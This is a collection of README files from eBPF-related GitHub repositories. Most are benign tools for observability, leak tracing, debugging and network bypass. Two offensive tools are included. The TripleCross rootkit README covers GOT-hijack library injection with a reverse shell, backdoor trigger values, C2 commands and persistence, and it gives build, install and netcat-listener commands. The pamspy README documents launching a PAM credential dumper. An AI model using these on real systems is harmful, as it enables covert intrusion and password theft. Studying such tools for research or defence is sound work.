- `match`: Conditions for stateless rules (e.g., regex for filenames or processes).
- `stateful`: Conditions for stateful rules (e.g., tracking file access followed by network activity).

Example rule:
```yaml
- name: ""Suspicious Execution From Temp""
  description: ""A process was executed from a temporary or world-writable directory.""
  enabled: true
  event: ""exec""
  severity: ""medium""
  match:
    filename_regex: ""^/(tmp|var/tmp|dev/shm)/.*""
```

Modify `pro_rules.yaml` to add or customize rules. Changes are automatically reloaded if `watchdog` is installed.

## Dashboard Features
The Grafana dashboard (`IDS Log Dashboard.json`) provides:
- **Severity Panels**: Displays counts of high, medium, and low severity alerts.
- **Severity Distribution**: A pie chart showing the proportion of alerts by severity.
- **Alert Details**: A table with process names, parent processes, and timestamps.
- **Log Stream**: A detailed view of logs with filtering by severity, rule name, and search terms.
![GrafanaUI](https://github.com/Sazidul0/Real-Time-eBPF-Intrusion-Detection-System/blob/main/images/GrafanaUI.png)

## Example Alerts
Sample alerts from `ids_alerts.log`:
- **Medium Severity**: Execution of `/tmp/test.sh` (rule: Suspicious Execution From Temp).
- **High Severity**: Process accessing `/etc/shadow` followed by a network connection (rule: Potential Data Exfiltration via Network).
- **Low Severity**: Package manager activity (e.g., `apt`, `dpkg`).

## Troubleshooting
- **No Logs in Grafana**: Ensure the `ids_alerts.log` path in `promtail-config.yaml` matches the file specified in `setupUI.sh`.
- **eBPF Errors**: Verify kernel headers and `bpfcc-tools` are installed for the current kernel (`uname -r`).
- **Docker Issues**: Check if Docker is running (`sudo systemctl status docker`) and ports are not in use.
- **Rule Not Triggering**: Confirm the rule is `enabled: true` in `pro_rules.yaml` and matches the event type.

## Contributing
Contributions are welcome! Please:
1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/your-feature`).
3. Commit changes (`git commit -m ""Add your feature""`).
4. Push to the branch (`git push origin feature/your-feature`).
5. Open a pull request.

## License
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
"
ErikKarlgren/sikte,10,0,10,0,Rust,eBPF-based observability tool for performance research on Linux,2025-08-19T17:56:41Z,2025-09-29T14:24:38Z,95,"# sikte

## Prerequisites

1. stable rust toolchains: `rustup toolchain install stable`
1. nightly rust toolchains: `rustup toolchain install nightly --component rust-src`
1. (if cross-compiling) rustup target: `rustup target add ${ARCH}-unknown-linux-musl`
1. (if cross-compiling) LLVM: (e.g.) `brew install llvm` (on macOS)
1. (if cross-compiling) C toolchain: (e.g.) [`brew install filosottile/musl-cross/musl-cross`](https://github.com/FiloSottile/homebrew-musl-cross) (on macOS)
1. bpf-linker: `cargo install bpf-linker` (`--no-default-features` on macOS)

## Build & Run

Use `cargo build`, `cargo check`, etc. as normal. Run your program with:

```shell
cargo run --release --config 'target.""cfg(all())"".runner=""sudo -E""'
```

Cargo build scripts are used to automatically build the eBPF correctly and include it in the
program.

## Cross-compiling on macOS

Cross compilation should work on both Intel and Apple Silicon Macs.

```shell
CC=${ARCH}-linux-musl-gcc cargo build --package sikte --release \
  --target=${ARCH}-unknown-linux-musl \
  --config=target.${ARCH}-unknown-linux-musl.linker=\""${ARCH}-linux-musl-gcc\""
```
The cross-compiled program `target/${ARCH}-unknown-linux-musl/release/sikte` can be
copied to a Linux server or VM and run there.

## License

All code is distributed under the terms of the [GNU General Public License, 
Version 2].

[GNU General Public License, Version 2]: LICENSE
"
vuvietnguyenit/gpu-memleak-trace,15,1,15,0,Go,eBPF-based tool can trace GPU memory leaks by processes in Linux.,2025-08-25T10:18:54Z,2025-09-26T03:56:31Z,108,"# GPU memleak trace

GPU Memory Leak Diagnostic & Monitoring Tool based on eBPF

This tool helps diagnose GPU-related issues by tracing memory allocations and deallocations in real time. It detects potential leaks, correlates them with process metadata (PID, user, command), and periodically reports statistics such as total leaked memory.

## Features
- Multi-GPU aware: Traces allocations across all GPUs on a node, not just a single device, making it suitable for modern multi-GPU servers.
- Real-time leak detection with process context.

## Performance testing
See: [performance result](docs/performance.md)

## Build
```shell
root@gpu1 ~/gpu-memleak-trace (main)# make build 
>> Generate eBPF code from .bpf.c
go generate ./src/go
>> Building gpu-memleak-trace
go build  -ldflags ""-s -w"" -o ./bin/gpu-memleak-trace ./src/go
root@gpu1 ~/gpu-memleak-trace (main)# 
```

## Trace memory leaked by command

In this case, we can trace total leaked bytes in each GPU
First, need to run trace tool:

```shell
root@gpu1 ~/gpu-memleak-trace (main)# ./bin/gpu-memleak-trace --trace-print
time=2025-09-14T15:51:22.213+07:00 level=INFO msg=""eBPF program running... Press Ctrl+C to exit.""
time=2025-09-14T15:51:22.213+07:00 level=INFO msg=""Running in DEBUG mode: ignoring --trace-print and --export-metrics""
```
When it run, if we have any leak allocated, the leaked result will be print to console.
***Example:***
```text
--- Scan Time: 2025-09-14 15:51:52 ---

PID=603409 TID=603409 UID=0 DEV=0 Comm=python -> TotalSize=9.44 MB LastTs=2025-09-14 15:51:52.213767602
Top allocations for TID=603409:
  Size=512.00 B, Ptr=0x0000735467000000
  Size=512.00 B, Ptr=0x0000735467000200
  Size=512.00 B, Ptr=0x0000735467000400
  Size=512.00 B, Ptr=0x0000735467000600
  Size=512.00 B, Ptr=0x0000735467000800
```
If you want to have a better overall view of the trace tool, you need to see some test cases at: [Experimental](docs/experimentals.md)



"
MikolajKolek/ebpf-memory-monitor,5,0,5,0,Rust,An ebpf-based Rust library for monitoring the VmPeak of a process and checking if it tried to exceed RLIMIT_AS.,2025-08-16T16:32:45Z,2025-09-28T21:17:16Z,4,"# ebpf-memory-monitor

## Prerequisites

For now, using the library requires building the ebpf programs locally. This may change in the future, but currently the following is required:

1. stable rust toolchains: `rustup toolchain install stable`
2. nightly rust toolchains: `rustup toolchain install nightly --component rust-src`
3. (if cross-compiling) rustup target: `rustup target add ${ARCH}-unknown-linux-musl`
4. (if cross-compiling) LLVM: (e.g.) `brew install llvm` (on macOS)
5. (if cross-compiling) C toolchain: (e.g.) [`brew install filosottile/musl-cross/musl-cross`](https://github.com/FiloSottile/homebrew-musl-cross) (on macOS)
6. bpf-linker: `cargo install bpf-linker` (`--no-default-features` on macOS)

## Build & Run

Use `cargo build`, `cargo check`, etc. as normal. Run your program with:

```shell
cargo test --release --config 'target.""cfg(all())"".runner=""sudo -E""' -- --nocapture
```

Cargo build scripts are used to automatically build the eBPF correctly and include it in the
program.

# Requirements

Ebpf-memory-listener currently requires the use of Linux 5.5 or above.

## License

With the exception of eBPF code, ebpf-memory-monitor is distributed under the terms
of the [MIT license].

The `non_mut_modify` module is based on the source code of [`aya`](https://github.com/aya-rs/aya), version 0.13.1, also available under the terms of the MIT license.

### eBPF

All eBPF code is distributed under either the terms of the
[GNU General Public License, Version 2] or the [MIT license], at your
discretion.

[MIT license]: LICENSE-MIT
[GNU General Public License, Version 2]: LICENSE-GPL2
"
lac-dcc/honey-potion,286,11,286,8,C,Writing eBPF programs with Elixir!,2022-01-12T17:00:27Z,2025-10-12T16:21:39Z,264,"# ðŸ¯ Honey Potion - Writing eBPF with Elixir ðŸ¯

[![Hex Version](https://img.shields.io/hexpm/v/honey.svg)](https://hex.pm/packages/honey)
[![Hex Docs](https://img.shields.io/badge/hex-docs-lightgreen.svg)](https://hexdocs.pm/honey/)
[![Total Download](https://img.shields.io/hexpm/dt/honey.svg)](https://hex.pm/packages/honey)
[![License](https://img.shields.io/hexpm/l/honey.svg)](https://github.com/lac-dcc/honey-potion/blob/master/LICENSE)
[![Last Updated](https://img.shields.io/github/last-commit/lac-dcc/honey-potion.svg)](https://github.com/lac-dcc/honey-potion/commits/master)
[![join discord](https://badgen.net/badge/discord/Join%20Eigr%20on%20Discord/discord?icon=discord&label&color=blue)](https://discord.gg/uqRmWkJ3eT)

## ðŸ About

**Honey Potion** is a framework that brings the power of **[eBPF](https://ebpf.io/)** to Elixir, allowing users to write Elixir code that is transformed into eBPF bytecode.

In this alpha version, Honey Potion translates Elixir code into a subset of C that leverages [libbpf](https://github.com/libbpf/libbpf). The generated C code is then compiled using `clang` to produce the eBPF bytecode, which can be loaded into the kernel.

![Honey Potion Logo](./assets/honey.png)

---

## ðŸ“¦ Dependencies

Honey Potion requires the following dependencies, listed with their Ubuntu package names (equivalents exist for other distributions):

- **Erlang & Elixir** â€“ Required for running Honey Potion
- **libbpf** â€“ Version 1.1 ([installation guide](https://www.youtube.com/watch?v=PhHs9u9toTg&list=PL9cmSHf85lF5HzCha020qegkKQ3GpiEBY&index=2))
- **gcc-multilib** â€“ Required for certain C libraries (`asm/types.h`)
- **make** â€“ For Makefile-based compilation
- **llvm** â€“ Provides `llc`
- **clang** â€“ Required for compilation
- **bpftool** â€“ Used for skeleton generation

> â„¹ï¸ **Note:** You can manually compile `clang`, `llc`, and `bpftool`, as long as they are available in your `$PATH`.

---

## ðŸŽ¥ Video Guide

Prefer a video tutorial? Check out the [Honey Potion YouTube playlist](https://www.youtube.com/playlist?list=PL9cmSHf85lF5HzCha020qegkKQ3GpiEBY) with step-by-step guides.

[![YouTube Thumbnail](./assets/youtube.png)](https://www.youtube.com/playlist?list=PL9cmSHf85lF5HzCha020qegkKQ3GpiEBY)

---

## ðŸš€ Installation

Add `honey` to your project's dependencies in `mix.exs`:

```elixir
def deps do
  [
    {:honey, git: ""https://github.com/lac-dcc/honey-potion/"", submodules: true}
  ]
end
```

---

## ðŸ“ Usage

When you `use Honey` in your module, it will be translated to C the next time you compile your project.

```elixir
defmodule Minimal do
  use Honey, license: ""Dual BSD/GPL""
  # ...
end
```

This generates the following directories:

- **`src/`** â€“ Stores the generated C code (e.g., `Minimal.bpf.c`)
- **`obj/`** â€“ Stores compilation objects (e.g., `Minimal.o`)
- **`bin/`** â€“ Stores the final executable (e.g., `Minimal`)

To run your program, navigate to the `bin/` directory and execute the binary with appropriate privileges.

### ðŸ”§ Command-line Options

- `-p` â†’ Prints all eBPF maps
- `-t <seconds>` â†’ Specifies the duration the program should run

#### ðŸŽ¯ The `main/1` Function

Every module using `Honey` must define a `main/1` function that serves as the entry point for the eBPF program.

```elixir
defmodule Example.Minimal do
  use Honey, license: ""Dual BSD/GPL""

  @sec ""tracepoint/syscalls/sys_enter_kill""
  def main(ctx) do
    # ...
  end
end
```

- `@sec` specifies the **program type** according to `libbpf`.
- `ctx` is a struct whose fields vary depending on the program type.
- The `main/1` function **must** return an integer; otherwise, a runtime exception is thrown.

For detailed documentation and examples, see:

- [`docs/Language.md`](docs/Language.md)
- Example programs in [`/examples/lib`](examples/lib):
  - `HelloWorld.ex`
  - `Maps.ex`
  - `CountSysCalls.ex`
  - `Forcekill.ex`

Or watch the [YouTube tutorial](https://www.youtube.com/watch?v=Wis5e3vLcMg).

---

## âš ï¸ Runtime Exceptions

As Elixir is a dynamically typed language, we simulate runtime exceptions when translating programs to eBPF.

In this Alpha version, if an exception occurs, it will be printed to the debug pipe, and the program will exit with status `0`.

---

## ðŸš§ Current Limitations

Honey Potion is still in **Alpha**, and many features are still being developed. Some known limitations include:

- **Pattern Matching:** No destructuring; `=` behaves like an assignment operator.
- **Control Flow:** No `case` or `if-else` blocks (unless optimized out at compile time).
- **Operators:** Limited to `+`, `-`, `*`, `/`, and `==`.
- **Function Guards:** Not supported.
- **Default Arguments:** Not supported.
- **Recursion:** No mutual recursion support.
- **Structs:** User-defined structs are not supported.
- **Execution Requirements:** Executable must reside in `bin/`, and the object file must be in `obj/`.

We are actively working to improve Honey Potion. Stay tuned!

---

## ðŸ¤ Contributing

Contributions are welcome! To avoid redundant work, please reach out before submitting major changes.

Feedback and suggestions are highly appreciated! You can:

- Open a [GitHub issue](https://github.com/lac-dcc/honey-potion/issues)
- Contact us at **kaelsoaresaugusto@gmail.com**

---

## ðŸ“œ License

**Honey Potion** is maintained by the **Compilers Laboratory** at the **Federal University of Minas Gerais (UFMG), Brazil**.

This program is **free software** under the terms of the **GNU General Public License (GPLv3)**.

For details, see the full license: [GNU GPL v3](https://www.gnu.org/licenses/).

---

"
tiann/eadb,531,68,531,11,Rust,eBPF Android Debug Bridge,2022-06-15T06:47:59Z,2025-10-07T09:08:39Z,45,"# eadb - eBPF Android Debug Bridge 

eadb provides a powerful Linux shell environment where one can run [BCC](https://github.com/iovisor/bcc) / [bpftrace](https://github.com/iovisor/bpftrace) / [bpftool](https://github.com/libbpf/bpftool) on Android device.

## Usage

Install the eadb first, please refer [Install](https://github.com/tiann/eadb#install)

### Prepare eadb environment on Android device

eadb support two mode to connect the device:

- adb
- ssh

Both of them need the root privilege.

If you want to use `adb` mode, `adb root` is required but `adb root` is disabled in production build, if you doesn't have any userdebug / eng devices, you can try [adb_root](https://github.com/tiann/adb_root). But it you don't any experience on Magisk(it may brick your device), it is recommended to use `ssh` mode.

If you use `ssh` mode, it is recommended to install [Magisk](https://github.com/topjohnwu/Magisk) to Root your device and install [MagiskSSH](https://gitlab.com/d4rcm4rc/MagiskSSH_releases) to enable ssh.

#### Download it from github

When you can use adb or ssh to connect to your device, you can prepare the eadb environment:

```sh
eadb --ssh root@ip prepare
```

The command would download a rootfs from [Release page](https://github.com/tiann/eadb/releases) and push it to your device, then do some mounts and chroot in to the environment.

#### Use an existing archive

You can also download or build the rootfs and then prepare it by your rootfs file:

```sh
eadb --ssh root@ip prepare -a path/to/archive
```

### Enter the environment

```sh
eadb --ssh root@ip shell
```

You will enter the eadb environment and get a shell by this command, you can use `apt update` to update the sources and install softwares(such as clang,llvm,bpftrace) by yourself, you can even install `Rust` / `Golang` or `gcc` to do development on this device!

### Build the environment by yourself

Only Ubuntu / Debian is supported to build the system image running on Android, you can use docker or podman on macOS and WSL on Windows.

Install `qemu-user-static` and `debootstrap` first:

```sh
sudo apt update && sudo apt install qemu-user-static debootstrap
```

And then build the eadb (root is required):

```sh
sudo eadb build
```

After the build, you will get a `debianfs-full(mini).tar.gz` in your working directory. you can use this image as your environment:

```sh
eadb --ssh root@ip prepare -a deb.tar.gz
```

## Install

### Binary

Download binaries in [Release page](https://github.com/tiann/eadb/releases)

### Build from source

1. Install [Rust toolchain](https://www.rust-lang.org/tools/install)
2. git clone https://github.com/tiann/eadb
3. cargo build

### Cargo

If you have Rust toolchain installed, you can install it with cargo:

```sh
cargo install eadb
```

## Credits

All my credits to [adeb](https://github.com/joelagnel/adeb)! eadb is just a rewritten for adeb.

## Contact

twsxtd#gmail.com
"
intel/istio-tcpip-bypass,104,30,104,1,C,,2021-12-22T08:00:29Z,2025-07-09T03:11:37Z,12,"# DISCONTINUATION OF PROJECT #  
This project will no longer be maintained by Intel.  
Intel has ceased development and contributions including, but not limited to, maintenance, bug fixes, new releases, or updates, to this project.  
Intel no longer accepts patches to this project.  
 If you have an ongoing need to use this project, are interested in independently developing it, or would like to maintain patches for the open source software community, please create your own fork of this project.  
  
TCP/IP Bypass with eBPF in Istio
================================

This solution aims to bypass TCP/IP stack to accelerate service mesh, it benefits two scenarios:

* p2p communication with sidecar injected
* p2p communication without sidecar injected

This solution is totally independent, which

* does not require changes to linux kernel
* does not require changes to Istio and Envoy (>= v1.10)
* does not require changes to CNI plugin

15%~20% latency decrease is expected for p2p communication on the same host.

System Requirements
~~~~~~~~~~~~~~~~~~~

* Minimal: Distribution with kernel version >= 4.18
* Optimal: Ubuntu 20.04 with Linux 5.4.0-74-generic


Build Docker Image and Load eBPF Program
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#. Build docker image::

    $ docker build --network=host -t ${IMAGE_NAME} .

#. Load eBPF program via docker command::

    $ docker run --mount type=bind,source=/sys/fs,target=/sys/fs,bind-propagation=rshared --privileged --name tcpip-bypass  ${IMAGE_NAME}

#. Load eBPF program via setting up a deamonset::

    $ kubectl apply -f bypass-tcpip-daemonset.yaml

#. Unload eBPF program via destroying Docker container or deamonset


Debug Log
~~~~~~~~~

#. Enable debug log via modifying the debug MAP::

    $ sudo bpftool map update name debug_map key hex 0 0 0 0  value hex 1 0 0 0

#. Read log from kernel tracepipe::

    $ sudo cat /sys/kernel/debug/tracing/trace_pipe
"
h3xduck/TripleCross,1902,238,1902,18,C,"A Linux eBPF rootkit with a backdoor, C2, library injection, execution hijacking, persistence and stealth capabilities.",2021-10-27T17:47:58Z,2025-10-08T16:06:10Z,232,"# TripleCross
![License](https://img.shields.io/github/license/h3xduck/TripleCross)
![GitHub release (latest by date including pre-releases)](https://img.shields.io/github/v/release/h3xduck/TripleCross?include_prereleases)
![Maintainability](https://img.shields.io/static/v1?label=maintainability&message=B&color=green)
![GitHub last commit](https://img.shields.io/github/last-commit/h3xduck/TripleCross)

TripleCross is a Linux eBPF rootkit that demonstrates the offensive capabilities of the eBPF technology.

TripleCross is inspired by previous implant designs in this area, notably the works of Jeff Dileo at DEFCON 27[^1], Pat Hogan at DEFCON 29[^2], Guillaume Fournier and Sylvain Afchain also at DEFCON 29[^3], and Kris NÃ³va's Boopkit[^4]. We reuse and extend some of the techniques pioneered by these previous explorations of the offensive capabilities of eBPF technology.

This rootkit was created for my Bachelor's Thesis at UC3M. More details about its design are provided in the [thesis document](https://github.com/h3xduck/TripleCross/blob/master/docs/ebpf_offensive_rootkit_tfg.pdf).

### Disclaimer
This rookit is **purely for educational and academic purposes**. The software is provided ""as is"" and the authors are not responsible for any damage or mishaps that may occur during its use.

Do not attempt to use TripleCross to violate the law. Misuse of the provided software and information may result in criminal charges.

## Contents
1. [Features](#features)
2. [TripleCross overview](#triplecross-overview)
3. [Build and install](#build-and-install)
4. [Library injection module](#library-injection-module)
5. [Backdoor and C2](#backdoor-and-c2)
6. [Execution hijacking module](#execution-hijacking-module)
7. [Rootkit persistence](#rootkit-persistence)
8. [Rootkit stealth](#rootkit-stealth)
9. [License](#license)


## Features
1. A **library injection** module to execute malicious code by writing at a process' virtual memory.
2. An **execution hijacking** module that modifies data passed to the kernel to execute malicious programs.
3. A **local privilege escalation** module that allows for running malicious programs with root privileges.
4. A **backdoor with C2** capabilities that can monitor the network and execute commands sent from a remote rootkit client. It incorporates multiple activation triggers so that these actions are transmitted stealthily.
5. A **rootkit client** that allows an attacker to establish 3 different types of shell-like connections to send commands and actions that control the rootkit state remotely.
6. A **persistence** module that ensures the rootkit remains installed maintaining full privileges even after a reboot event.
7. A **stealth** module that hides rootkit-related files and directories from the user.


[^1]: J. Dileo. Evil eBPF: Practical Abuses of an In-Kernel Bytecode Runtime. DEFCON 27. [slides](https://raw.githubusercontent.com/nccgroup/ebpf/master/talks/Evil_eBPF-DC27-v2.pdf)
[^2]: P. Hogan. Warping Reality: Creating and Countering the Next Generation of Linux Rootkits using eBPF. DEFCON 27. [presentation](https://www.youtube.com/watch?v=g6SKWT7sROQ)
[^3]: G. Fournier and S. Afchain. eBPF, I thought we were friends! DEFCON 29. [slides](https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Guillaume%20Fournier%20Sylvain%20Afchain%20Sylvain%20Baubeau%20-%20eBPF%2C%20I%20thought%20we%20were%20friends.pdf)
[^4]: Kris NÃ³va. Boopkit. [github](https://github.com/kris-nova/boopkit)

## TripleCross overview
The following figure shows the architecture of TripleCross and its modules.

<img src=""docs/images/rootkit.png"" float=""left"">

The raw sockets library RawTCP_Lib used for rootkit transmissions is of my authorship and has [its own repository](https://github.com/h3xduck/RawTCP_Lib).

The following table describes the main source code files and directories to ease its navigation:
| DIRECTORY  | COMMAND |
| ------------- | ------------- |
| docs  | Original thesis document |
| src/client | Source code of the rootkit client |
| src/client/lib | RawTCP_Lib shared library |
| src/common | Constants and configuration for the rootkit. It also includes the implementation of elements common to the eBPF and user space side of the rootkit, such as the ring buffer |
| src/ebpf | Source code of the eBPF programs used by the rootkit |
| src/helpers | Includes programs for testing the functionality of several rootkit modules, and also the malicious program and library used at the execution hijacking and library injection modules, respectively |
| src/libbpf | Contains the libbpf library integrated with the rootkit|
| src/user | Source code of the userland programs used by the rootkits|
| src/vmlinux |  Headers containing the definition of kernel data structures (this is the recommended method when using libbpf) |


### Build and Install
#### Requirements
This research project has been tested under the following environments:
|| DISTRIBUTION | KERNEL | GCC | CLANG | GLIBC |
| ------------- | ------------- | ------------- | ------------- | ------------- | ------------- |
**VERSION** | Ubuntu 21.04 | 5.11.0 | 10.3.0 | 12.0.0 | 2.33 |

We recommend using Ubuntu 21.04, which by default will incorporate the software versions shown here. Otherwise, some of the problems you may run into are described [here](https://github.com/h3xduck/TripleCross/issues/41#issuecomment-1176642139).

#### Compilation
The rootkit source code is compiled using two Makefiles.
```
# Build rootkit
cd src
make all
# Build rootkit client
cd client
make
```
The following table describes the purpose of each Makefile in detail:

| MAKEFILE  | COMMAND | DESCRIPTION | RESULTING FILES |
| ------------- | ------------- | ------------- | ------------- |
| src/client/Makefile  | make  | Compilation of the rootkit client | src/client/injector |
| src/Makefile  | make help  | Compilation of programs for testing rootkit capabilities, and the malicious program and library of the execution hijacking and library injection modules, respectively | src/helpers/simple_timer, src/helpers/simple_open, src/helpers/simple_execve, src/helpers/lib_injection.so, src/helpers/execve_hijack |
| src/Makefile | make kit | Compilation of the rootkit using the libbpf library | src/bin/kit |
| src/Makefile | make tckit | Compilation of the rootkit TC egress program | src/bin/tc.o |

### Installation
Once the rootkit files are generated under src/bin/, the *tc.o* and *kit* programs must be loaded in order. In the following example, the rootkit backdoor will operate in the network interface *enp0s3*:
```
// TC egress program
sudo tc qdisc add dev enp0s3 clsact
sudo tc filter add dev enp0s3 egress bpf direct-action obj bin/tc.o sec classifier/egress
// Libbpf-powered rootkit
sudo ./bin/kit -t enp0s3
```

### Attack scenario scripts
There are two scripts, *packager&#46;sh* and *deployer&#46;sh*, that compile and install the rootkit automatically, just as an attacker would do in a real attack scenario. 

* Executing packager&#46;sh will generate all rootkit files under the *apps/* directory.

* Executing deployer&#46;sh will install the rootkit and create the persistence files.

These scripts must first be configured with the following parameters for the proper functioning of the persistence module:
| SCRIPT | CONSTANT | DESCRIPTION |
| ------------- | ------------- | ------------- |
| src/helpers/deployer.sh | CRON_PERSIST | Cron job to execute after reboot |
| src/helpers/deployer.sh | SUDO_PERSIST | Sudo entry to grant password-less privileges |

## Library injection module
The rootkit can hijack the execution of processes that call the *sys_timerfd_settime* or *sys_openat* system calls. This is achieved by overwriting the Global Offset Table (GOT) section at the virtual memory of the process making the call. This leads to a malicious library (*src/helpers/injection_lib.c*) being executed. The library will spawn a reverse shell to the attacker machine, and then returns the flow of execution to the original function without crashing the process.

TripleCross is prepared to bypass common ELF hardening techniques, including:
* ASLR
* Stack canaries
* DEP/NX
* PIE
* Full RELRO

It is also prepared to work with Intel CET-compatible code.

The module functionality can be checked using two test programs *src/helpers/simple_timer.c* and *src/helpers/simple_open.c*. Alternatively you may attempt to hijack any system process (tested and working with systemd).

The module configuration is set via the following constants:

| FILENAME | CONSTANT | DESCRIPTION |
| ------------- | ------------- | ------------- |
| src/common/constants.h | TASK_COMM_NAME_INJECTION_<br>TARGET_TIMERFD_SETTIME | Name of the process to hijack at syscall sys_timerfd_settime |
| src/common/constants.h | TASK_COMM_NAME_INJECTION_<br>TARGET_OPEN | Name of the process to hijack at syscall sys_openat |
| src/helpers/injection_lib.c| ATTACKER_IP & ATTACKER_PORT| IP address and port of the attacker machine|

Receiving a reverse shell from the attacker machine can be done with netcat:
```
nc -nlvp <ATTACKER_PORT>
```

### Library injection via GOT hijacking technique
The technique incorporated in TripleCross consists of 5 stages:

#### Locating GOT and the return address
The rootkit hooks the system call using a tracepoint program. From there, it locates the address at the GOT section which the PLT stub used to make the call to the glibc function responsible of the syscall. 

In order to reach the GOT section, the eBPF program uses the return address stored at the stack. Note that:
* The .text makes a *call* to the .plt, so *rip* is saved as *ret* in the stack.
* The .plt makes a *jump* to glibc using .got, so no other *rip* is saved. It also does not modify or save the value of *rbp*.
* Glibc makes a *syscall*, which does not save *rip* in the stack, but rather saves it in *rcx*. 

<img src=""docs/images/plt_got_glibc_flow.jpg"" float=""left"">

Therefore in order to check from eBPF that an address in the stack is the return address that will lead us to the correct GOT, we must check that it is the return address of the PLT stub that uses the GOT address that jumps to the glibc function making the system call we hooked from eBPF.

Two techniques for finding the return address have been incorporated:
* With sys_timerfd_settime, the eBPF program scans forward in the scan using the syscall arguments.
* With sys_openat, the eBPF program scans uses the data at tracepoints' *pt_regs* struct for scanning the return address.

<img src=""docs/images/lib_injection-s1.png"" float=""left"">


#### Locating key functions for shellcode
The shellcode must be generated dynamically to bypass ASLR and PIE, which change the address of functions such as dlopen() on each program execution.

<img src=""docs/images/lib_injection-s2.png"" float=""left"">


#### Injecting shellcode in a code cave
A code cave can be found by reverse engineering an ELF if ASLR and PIE are off, but usually that is not the case. The eBPF program issues a request to an user space rootkit program that uses the /proc filesystem to locate and write into a code cave at the .text (executable) section.

<img src=""docs/images/lib_injection-s3.png"" float=""left"">

#### Overwriting the GOT section
Depending on whether Partial or Full RELRO are active on the executable, the eBPF program overwrites the GOT section directly or with the /proc filesystem.

<img src=""docs/images/lib_injection-s4.png"" float=""left"">

#### Waiting for the next system call
When the next syscall is issued in the hijacked program, the PLT section uses the modified GOT section, hijacking the flow of execution which gets redirected to the shellcode at the code cave. The shellcode is prepared to keep the program from crashing, and calls the malicious library (*src/helpers/lib_injection.so*). This library issues a fork() and spawns a reverse shell with the attacker machine. Afterwards the flow of execution is restored.

<img src=""docs/images/lib_injection-s5.png"" float=""left"">



## Backdoor and C2
The backdoor works out of the box without any configuration needed. The backdoor can be controlled remotely using the rootkit client program:

| CLIENT ARGUMENTS | ACTION DESCRIPTION |
| ------------- | ------------- |
| ./injector -c \<Victim IP\> | Spawns a plaintext pseudo-shell by using the execution hijacking module |
| ./injector -e \<Victim IP\> | Spawns an encrypted pseudo-shell by commanding the backdoor with a pattern-based trigger |
./injector -s \<Victim IP\> | Spawns an encrypted pseudo-shell by commanding the backdoor with a multi-packet trigger (of both types) |
./injector -p \<Victim IP\> | Spawns a phantom shell by commanding the backdoor with a pattern-based trigger |
./injector -a \<Victim IP\> | Orders the rootkit to activate all eBPF programs |
./injector -u \<Victim IP\> | Orders the rootkit to detach all of its eBPF programs |
./injector -S \<Victim IP\> | Showcases how the backdoor can hide a message from the kernel (Simple PoC) |
| ./injector -h | Displays help |

### Backdoor triggers

Actions are sent to the backdoor using backdoor triggers, which indicate the backdoor the action to execute depending on the value of the attribute **K3**:

| K3 VALUE | ACTION |
| ------------- | ------------- |
| 0x1F29 | Request to start an encrypted pseudo-shell connection |
| 0x4E14 | Request to start a phantom shell connection |
| 0x1D25 | Request to load and attach all rootkit eBPF programs |
| 0x1D24 | Request to detach all rootkit eBPF programs (except the backdoorâ€™s) |


#### Pattern-based trigger
This trigger hides the command and client information so that it can be recognized by the backdoor, but at the same time seems random enough for an external network supervisor. It is based on the trigger used by the recently discovered NSA rootkit [Bvp47](https://www.pangulab.cn/files/The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group.en.pdf).

<img src=""docs/images/packet_examples_bvp47_trigger.png"" float=""left"">

#### Multi-packet trigger
This trigger consists of multiple TCP packets on which the backdoor payload is hidden in the packet headers. This design is based on the CIA [Hive](https://wikileaks.org/vault7/document/hive-DevelopersGuide/hive-DevelopersGuide.pdf) implant described in the Vault 7 leak. The following payload is used:

<img src=""docs/images/packet_examples_hive_data.png"" float=""left"">

A rolling XOR is then computed over the above payload and it is divided into multiple parts, depending on the mode selected by the rootkit client. TripleCross supports payloads hidden on the TCP sequence number:

<img src=""docs/images/packet_examples_hive_seqnum.png"" float=""left"">

And on the TCP source port:

<img src=""docs/images/packet_examples_hive_srcport.png"" float=""left"">

### Backdoor pseudo-shells
The client can establish rootkit pseudo-shells, a special rootkit-to-rootkit client connection which simulates a shell program, enabling the attacker to execute Linux commands remotely and"
citronneur/pamspy,1147,63,1147,3,C,Credentials Dumper for Linux using eBPF,2022-07-01T19:33:43Z,2025-10-08T16:06:16Z,8,"# pamspy -- Credentials Dumper for Linux

`pamspy` leverage eBPF technologies to achieve an equivalent work of [3snake](https://github.com/blendin/3snake).

It will track a particular userland function inside the PAM (Pluggable Authentication Modules) library, used by many critical applications to handle authentication like:
* sudo
* sshd
* passwd
* gnome
* x11
* and many other ...

![Demo](.img/pamspy.gif)

## How to launch?

`pamspy` is built as a static binary without any dependencies, and available on the [release](https://github.com/citronneur/pamspy/releases/) page.

```
Usage: pamspy [OPTION...]
pamspy

Uses eBPF to dump secrets use by PAM (Authentication) module
By hooking the pam_get_authtok function in libpam.so

USAGE: ./pamspy -p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4) -d /var/log/trace.0

  -d, --daemon=PATH TO OUTPUT CREDENTIALS
                             Start pamspy in daemon mode and output in the file
                             passed as argument
  -p, --path=PATH            Path to the libpam.so file
  -r, --print-headers        Print headers of the program
  -v, --verbose              Verbose mode
  -?, --help                 Give this help list
      --usage                Give a short usage message
  -V, --version              Print program version

Mandatory or optional arguments to long options are also mandatory or optional
for any corresponding short options.

Report bugs to .

```

As `pamspy` rely on libpam, we have to set the path where libpam is installed on your distribution. To find where libpam is installed you can run the following command :

```
> /usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4
/lib/x86_64-linux-gnu/libpam.so.0
```

Once you get the path you can launch `pamspy` :

```
> ./pamspy -p /lib/x86_64-linux-gnu/libpam.so.0
```

An easy way to launch `pamspy` is to use the following command :

```
> ./pamspy -p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4)
```

`pamspy` can also be started as a daemon by providing an output file where credentials will be written:

```
./pamspy -p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4) -d /tmp/credentials
```

## How to build?

To build the static binary, we need third-party program. For eBPF we need `clang` to compile the C code into eBPF CO-RE code.
We also rely on `bpftool` to create a skeleton from ebpf program to include it in our userland program. Then we need also `libelf` to find the correct symbol in libpam.

```
